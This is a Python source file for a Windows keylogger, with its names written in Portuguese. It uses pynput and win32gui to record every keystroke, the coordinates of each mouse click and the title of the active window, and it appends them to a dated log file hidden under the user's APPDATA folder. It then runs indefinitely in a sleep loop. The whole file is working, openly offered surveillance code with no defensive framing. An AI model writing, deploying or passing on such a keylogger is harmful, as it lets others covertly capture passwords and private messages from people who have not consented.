from pynput import mouse
from pynput import keyboard
import datetime
import time
import os
import win32gui
from screeninfo import get_monitors

class KeyLogger():
    try:
        os.mkdir(os.getenv('APPDATA')+'/Logs')
    except:
        pass
    timeStamp = str(datetime.date.today()).replace('-','')
    def __init__(self, NomeDoArquivo: str = os.getenv('APPDATA')+'/Logs/'+timeStamp+'.txt') -> None:
        self.NomeDoArquivo = NomeDoArquivo
        self.j2 = ''
        with open(self.NomeDoArquivo, 'a') as logs:
            for monitores in get_monitors():
                logs.write(str(monitores))

    @staticmethod
    def get_char(Tecla):
        try:
            if Tecla.char != None:
                return Tecla.char
            else:
                if str(Tecla) == '<96>':
                    return '0'
                if str(Tecla) == '<97>':
                    return '1'
                if str(Tecla) == '<98>':
                    return '2'
                if str(Tecla) == '<99>':
                    return '3'
                if str(Tecla) == '<100>':
                    return '4'
                if str(Tecla) == '<101>':
                    return '5'
                if str(Tecla) == '<102>':
                    return '6'
                if str(Tecla) == '<103>':
                    return '7'
                if str(Tecla) == '<104>':
                    return '8'
                if str(Tecla) == '<105>':
                    return '9'
        except AttributeError:
            if str(Tecla) == 'Key.space':
                Tecla = str(Tecla).replace('Key.space',' ')
            if str(Tecla) == 'Key.enter':
                Tecla = str(Tecla).replace('Key.enter','\n')
            return str(Tecla)

    def on_press(self, Tecla):
        with open(self.NomeDoArquivo, 'a') as logs:
            logs.write(self.get_win_name())
            try:
                logs.write(self.get_char(Tecla))
            except:
                pass

    def on_click(self, x, y, botao, pressionado):
        if pressionado:
            with open(self.NomeDoArquivo, 'a') as logs:
                logs.write('\nClick registrado em ({0}, {1}) usando {2}\n'.format(x, y, botao))
            
    def get_win_name(self):
        janela = win32gui
        self.j1 = janela.GetWindowText(janela.GetForegroundWindow())
        if self.j1 != self.j2:
            self.j2 = self.j1
            return '\n+- '+self.j2+' -+\n'
        else:
            return ''

    def main(self):
        escuta1 = keyboard.Listener(
            on_press = self.on_press,
        )
        escuta2 = mouse.Listener(
            on_click = self.on_click,
        )
        escuta1.start()
        escuta2.start()

if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    looper = 0
    while looper == 0:
        time.sleep(3600)